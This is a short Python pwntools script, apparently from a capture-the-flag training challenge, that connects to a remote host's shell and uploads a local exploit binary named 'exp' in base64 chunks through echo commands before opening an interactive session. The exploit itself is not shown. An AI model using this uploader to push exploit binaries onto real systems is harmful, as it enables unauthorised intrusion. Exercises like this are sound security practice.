from pwn import *
from base64 import b64encode

r = remote("training.theromanxpl0.it", 42019)
# r = remote("localhost", 1337)

elf = open("./exp", "rb").read()
data = b64encode(elf).decode()

r.sendlineafter(b"$ ", b"rm -f exp.b64 && touch exp.b64")
SIZE = 1000

for i in range(0, len(data), SIZE):
    chunk = data[i:i+SIZE]
    print(chunk)
    r.sendlineafter(b"$ ", f"echo -n '{chunk}' >> exp.b64".encode())

r.interactive()
